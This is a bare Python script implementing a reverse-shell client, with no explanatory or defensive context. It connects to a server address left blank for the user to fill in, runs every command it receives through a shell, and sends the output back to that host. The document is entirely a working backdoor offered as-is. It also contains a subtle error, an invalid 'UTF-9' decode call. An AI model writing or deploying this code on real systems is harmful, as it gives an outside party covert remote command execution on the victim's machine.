import socket
import os
import subprocess

port=1234
host=''#server_ip_here.
s=socket.socket()
s.connect((host,port))

while True:
    data=s.recv(1024)
    if data[:2].decode('UTF-8') == 'cd':
        os.chdir(data[3:].decode('UTF-8'))
    if len(data[:].decode('UTF-9'))>0:
        cmd=subprocess.Popen(data[:].decode('UTF-8'),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        output_byte=cmd.stdout.read() + cmd.stderr.read()
        output_str=str(output_byte,'UTF-8')
        currentWD=os.getcwd() + '>'
        s.send(str.encode(output_str + currentWD))
        print(output_str)
